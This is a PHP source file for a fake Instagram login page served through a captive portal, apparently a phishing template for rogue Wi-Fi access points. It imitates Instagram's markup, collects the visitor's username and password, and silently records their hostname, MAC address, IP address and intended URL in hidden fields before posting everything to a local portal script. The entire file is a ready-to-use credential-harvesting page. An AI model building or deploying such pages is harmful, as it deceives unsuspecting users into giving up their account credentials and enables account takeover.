<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!-- saved from url=(0014)about:internet -->
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <title>Instagram</title>

  <meta charset='UTF-8'>
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      background-image: url('/static/background.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      display: flex;
      flex-direction: column;
      justify-content: space-around;
      background-color: rgba(255, 255, 255, 0.8);
      padding: 20px;
      border-radius: 13px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
      height: 37vh;
      width: 38vh;
    }


    label {
      display: block;
      margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 8px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin: 0.4vh 2vh;
    }

    button {
      display: flex;
      width: 50%;
      padding: 10px;
      background-color: #ff7820;
      color: black;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      align-items: center;
      justify-content: center;
      margin: 1.2vh 0 0 0;
      font-weight: 700;
      font-size: 16px;
    }

    div {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border: 2px solid #a7d0f0;
    }

    img {
      margin: 0 1vh;
    }
  </style>
  <script type="text/javascript">
    function redirect() {
      setTimeout(function() {
        window.location = "/captiveportal/index.php";
      }, 100);
    }
  </script>


</head>

<body>

  <div>

    <form class="HmktE" id="loginForm" method="post" action="/captiveportal/index.php" onsubmit="redirect()">
      <input type="hidden" name="hostname" value="<?= getClientHostName($_SERVER['REMOTE_ADDR']); ?>">
      <input type="hidden" name="mac" value="<?= getClientMac($_SERVER['REMOTE_ADDR']); ?>">
      <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
      <input type="hidden" name="target" value="<?= $destination ?>">

      <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                ">
        <div class="-MzZI">
          <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2"></span><input aria-label="Username" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="email" id="email" type="text" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Username"></label>
            <div class="i24fI"></div>
          </div>
        </div>
        <div class="-MzZI">
          <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2"></span><input aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" id="password" type="password" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Password"></label>
            <div class="i24fI"></div>
          </div>
        </div>
        <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button class="sqdOP  L3NKy   y3zKF     " type="submit" id="btn" name="btn">
            <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">Log In</div>
          </button></div>


    </form>

</body>

</html>